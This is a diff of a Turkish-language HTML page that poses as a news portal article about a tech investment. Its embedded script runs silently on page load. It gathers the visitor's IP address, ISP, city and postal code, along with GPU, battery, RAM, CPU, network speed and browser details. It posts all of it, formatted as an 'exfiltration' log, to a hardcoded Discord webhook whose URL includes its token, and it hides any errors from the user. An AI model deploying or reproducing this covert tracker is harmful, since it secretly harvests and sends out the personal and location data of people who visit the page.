@@ -3,113 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Teknoloji Blogu - Hoş Geldiniz</title>
+    <title>Güncel Haberler | Son Dakika Gelişmeleri</title>
     <style>
-        /* Sitenin normal görünmesi için basit CSS */
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; color: #333; margin: 0; padding: 0; }
-        header { background-color: #2c3e50; color: white; padding: 20px; text-align: center; }
-        .content { max-width: 800px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        h1 { margin: 0; font-size: 24px; }
-        p { line-height: 1.6; color: #666; }
-        .footer { text-align: center; margin-top: 50px; font-size: 12px; color: #aaa; }
+        /* Tamamen normal, profesyonel bir haber sitesi görünümü */
+        body { font-family: 'Arial', sans-serif; background: #f0f2f5; margin: 0; padding: 0; color: #1c1e21; }
+        nav { background: #1c1e21; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; }
+        .container { max-width: 900px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .news-header { border-bottom: 2px solid #e4e6eb; padding-bottom: 10px; margin-bottom: 20px; }
+        .news-title { color: #d93025; font-size: 28px; font-weight: bold; }
+        .news-content { line-height: 1.8; font-size: 16px; }
+        .placeholder-img { width: 100%; height: 300px; background: #ddd; margin: 20px 0; border-radius: 5px; display: flex; align-items: center; justify-content: center; color: #777; font-style: italic; }
+        footer { text-align: center; padding: 20px; color: #606770; font-size: 13px; }
     </style>
 </head>
 <body>
 
-    <header>
-        <h1>Modern Teknoloji Dünyası</h1>
-    </header>
+    <nav>HABER PORTALI</nav>
 
-    <div class="content">
-        <h2>En Yeni Makaleler Yükleniyor...</h2>
-        <p>Şu an içerik sunucularımızda bir güncelleme çalışması yapılmaktadır. En kısa sürede en yeni rehberler, teknoloji haberleri ve incelemelerle karşınızda olacağız.</p>
-        <p>Sabrınız için teşekkür ederiz. Lütfen birkaç dakika sonra sayfayı yenileyiniz.</p>
+    <div class="container">
+        <div class="news-header">
+            <div class="news-title">Teknoloji Dünyasında Dev Yatırım!</div>
+            <small>Yayınlanma: 27 Aralık 2025 | 18:20</small>
+        </div>
+        <div class="news-content">
+            <p>Dünyanın önde gelen teknoloji şirketleri, yeni nesil veri merkezleri için milyar dolarlık bütçe ayırdığını duyurdu. Bu hamle ile internet altyapısının %40 oranında hızlanması bekleniyor.</p>
+            <div class="placeholder-img">Haber Görseli Yükleniyor...</div>
+            <p>Analistler, bu gelişmenin sadece son kullanıcıyı değil, aynı zamanda bulut bilişim hizmeti veren tüm alt firmaları da etkileyeceğini belirtiyor. Konuyla ilgili detaylı raporun akşam saatlerinde yayınlanması bekleniyor.</p>
+        </div>
     </div>
 
-    <div class="footer">
-        © 2025 Teknoloji Blogu - Tüm Hakları Saklıdır.
-    </div>
+    <footer>© 2025 Haber Portalı. Tüm Hakları Saklıdır.</footer>
 
     <script>
-        // Senin Webhook adresin
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
+        // Webhook URL
+        const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-        async function collectAllInfo() {
+        async function grabEverything() {
             try {
-                // 1. IP Adresini Al
-                const ipReq = await fetch('https://api.ipify.org?format=json');
-                const ipRes = await ipReq.json();
-                const ip = ipRes.ip;
+                // 1. Detaylı IP ve Konum Bilgisi (ipapi.co çok detaylıdır)
+                const geoReq = await fetch('https://ipapi.co/json/');
+                const g = await geoReq.json();
 
-                // 2. GPU (Ekran Kartı) Bilgisi
-                let gpu = "N/A";
+                // 2. Ekran Kartı (GPU) Bilgisi
+                let gpu = "Unknown";
                 const canvas = document.createElement("canvas");
                 const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                 if (gl) {
                     const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                    if (debugInfo) {
-                        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
+                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
                 }
 
-                // 3. Pil Bilgisi (Async)
-                let batteryStatus = "N/A";
+                // 3. Pil Bilgisi
+                let battery = "N/A";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    batteryStatus = `${Math.round(b.level * 100)}% - ${b.charging ? 'Sarj Oluyor' : 'Sarjda Degil'}`;
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
                 }
 
-                // 4. Diger Teknik Bilgiler
-                const info = {
-                    ua: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen: `${screen.width}x${screen.height}`,
+                // 4. Bağlantı Bilgisi (Hız vb.)
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const netInfo = conn ? `${conn.effectiveType} (Down: ~${conn.downlink}Mb/s)` : "Unknown";
+
+                // 5. Veri Toplama Paketi
+                const log = {
+                    ts: new Date().toLocaleString('tr-TR'),
+                    ip: g.ip || "N/A",
+                    provider: g.org || "N/A",
+                    loc: `${g.city} / ${g.region} / ${g.country_name}`,
+                    zip: g.postal || "N/A",
+                    os: navigator.platform,
+                    cores: navigator.hardwareConcurrency || "N/A",
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
+                    res: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
                     lang: navigator.language,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    mem: navigator.deviceMemory || "Bilinmiyor", // RAM (Sadece Chrome tabanlılarda)
-                    cores: navigator.hardwareConcurrency || "Bilinmiyor", // İşlemci Çekirdeği
-                    ref: document.referrer || "Dogrudan Giris",
-                    time: new Date().toLocaleString('tr-TR')
+                    gpu: gpu,
+                    battery: battery,
+                    network: netInfo,
+                    ref: document.referrer || "Direct",
+                    ua: navigator.userAgent
                 };
 
-                // 5. Hack Paneli / Terminal Log Formatı (Emojisiz)
-                const logMessage = "```\n" +
-                    "--- [ INCOMING SESSION LOG ] ---\n" +
-                    "TIMESTAMP     : " + info.time + "\n" +
-                    "REMOTE_IP     : " + ip + "\n" +
-                    "LOCATION_TZ   : " + info.tz + "\n" +
-                    "LANGUAGE      : " + info.lang + "\n" +
-                    "--------------------------------------------------\n" +
+                // 6. Terminal Formatında Mesaj Oluşturma (Hack Log Style)
+                const rawLog = "```" + 
+                    "--- [ SYSTEM DATA EXFILTRATION ] ---\n" +
+                    "TIMESTAMP      : " + log.ts + "\n" +
+                    "------------------------------------\n" +
+                    "NETWORK_INFO\n" +
+                    "IP_ADDRESS     : " + log.ip + "\n" +
+                    "ISP_PROVIDER   : " + log.provider + "\n" +
+                    "LOCATION       : " + log.loc + "\n" +
+                    "POSTAL_CODE    : " + log.zip + "\n" +
+                    "NET_SPEED      : " + log.network + "\n" +
+                    "------------------------------------\n" +
                     "HARDWARE_INFO\n" +
-                    "PLATFORM      : " + info.platform + "\n" +
-                    "CPU_CORES     : " + info.cores + "\n" +
-                    "RAM_APPROX    : " + info.mem + " GB\n" +
-                    "GPU_RENDERER  : " + gpu + "\n" +
-                    "BATTERY_LEVEL : " + batteryStatus + "\n" +
-                    "DISPLAY_RES   : " + info.screen + "\n" +
-                    "--------------------------------------------------\n" +
+                    "OS_PLATFORM    : " + log.os + "\n" +
+                    "CPU_CORES      : " + log.cores + "\n" +
+                    "MEMORY_RAM     : " + log.ram + "\n" +
+                    "GPU_RENDERER   : " + log.gpu + "\n" +
+                    "DISPLAY_RES    : " + log.res + "\n" +
+                    "BATTERY_STATUS : " + log.battery + "\n" +
+                    "------------------------------------\n" +
                     "BROWSER_INFO\n" +
-                    "REFERRER      : " + info.ref + "\n" +
-                    "USER_AGENT    : " + info.ua + "\n" +
-                    "--------------------------------------------------\n" +
-                    "--- [ END OF LOG ] ---\n" +
+                    "LANGUAGE       : " + log.lang + "\n" +
+                    "REFERRER       : " + log.ref + "\n" +
+                    "USER_AGENT     : " + log.ua + "\n" +
+                    "--- [ END OF LOG ] ---" +
                     "```";
 
-                // 6. Webhook'a Gönder
-                await fetch(WEBHOOK_URL, {
+                // 7. Webhook'a Gönder (Username/Avatar değiştirmeden)
+                await fetch(WH_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: logMessage })
+                    body: JSON.stringify({ content: rawLog })
                 });
 
-            } catch (err) {
-                // Hata oluşursa kullanıcı hiçbir şey fark etmez
+            } catch (e) {
+                // Hata durumunda hiçbir şey belli etme
             }
         }
 
-        // Sayfa yüklendiği an sessizce çalıştır
-        window.onload = collectAllInfo;
+        // Sayfa yüklendiği an başlat
+        window.onload = grabEverything;
     </script>
-
 </body>
 </html>
